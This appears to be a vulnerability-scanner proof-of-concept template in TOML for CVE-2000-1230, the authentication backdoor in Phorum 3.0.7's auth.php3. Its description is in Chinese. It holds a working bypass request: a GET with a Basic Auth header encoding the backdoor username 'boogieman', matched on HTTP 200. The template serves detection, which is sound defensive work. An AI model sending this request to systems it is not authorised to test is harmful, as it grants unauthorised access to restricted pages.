[info]
author = "ave"
description = "检测 Phorum 3.0.7 auth.php3 中的认证后门，攻击者可通过 HTTP Basic Auth 用户名为 boogieman 绕过认证访问受限页面。"
id = "POC-AVE-2000-0849"
name = "CVE-2000-1230 PoC"
severity = "medium"
tags = ["ave-2000-0849"]
vuln_id = [
    "CVE-2000-1230",
    "AVE-2000-0849",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/auth.php3"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic Ym9vZ2llbWFuOg=="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
